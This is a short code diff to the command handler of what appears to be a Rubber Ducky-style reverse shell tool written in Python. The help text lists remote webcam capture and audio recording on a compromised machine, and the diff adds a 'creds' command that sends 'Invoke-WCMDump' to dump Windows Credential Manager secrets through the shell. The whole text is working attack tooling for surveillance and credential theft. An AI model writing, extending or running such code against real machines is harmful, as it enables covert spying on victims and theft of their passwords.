@@ -180,6 +180,7 @@ while not stop:
             print("                     [device #]   Take a picture with the specified device number")
             print("ducky/audio          N/A          Record audio for 10 seconds and save in reverse shell directory")
             print("                     [seconds]    Record audio for a specified number of seconds")
+            print("ducky/creds          N/A          Preform a credential dump")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -342,6 +343,10 @@ while not stop:
                 length = int(options[0])
             commands = []
             commands.append("Get-MicrophoneAudio -path \"$env:userprofile/z/audio.mp3\" -length " + str(length))
+            stdin = "; ".join(commands)
+        elif ducky_command[:5] == "creds":
+            commands = []
+            commands.append("Invoke-WCMDump")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
